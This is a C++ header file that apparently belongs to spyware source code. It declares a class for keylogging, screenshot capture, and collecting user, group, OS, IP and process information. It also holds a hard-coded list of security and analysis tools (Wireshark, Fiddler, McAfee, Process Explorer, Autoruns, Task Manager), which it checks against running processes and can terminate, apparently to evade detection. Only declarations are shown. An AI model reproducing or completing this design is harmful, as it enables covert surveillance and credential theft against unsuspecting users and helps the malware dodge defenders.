#pragma once
#include <vector>
#include <string>
#include <map>
#include <thread>

using std::multimap;
using std::map;
using std::vector;
using std::string;

const std::string SearchTools[] = { "wireshark","fiddler","mcafee","procexp","procomon","autoruns","tasklist" ,"taskmgr"};
const int SEARCHTOOLSSIZE = 8;

class Info
{
public:

	Info();
	~Info();

	//void manageInfo();
	

public:
	static int numOfRounds;
	void writeToFile();
	void setKeyStrokes(); // thread
	void setScreenShots(string add); //const func
	void setDestIp();//thread
	void setConnectedUser(); // func
	void setRelatedGroups();// func
	void setOsVersion(); // func
	void setProcesses(); // thread
	void setIpAddress(); // func
	void terminateProcess(int pid);
	void startThreads();
	void closeThreads();

	//to suitable class

	
	bool isSearchTool(std::string procName) const;
	
	bool _work;
	vector<std::thread> _threads;

	string _connected_user;
	vector<string> _groups;
	string _os_version;
	string _ip;

	map<int, string> _processes;
	string _keyStrokes;
	vector<string> _dest_ip;




};

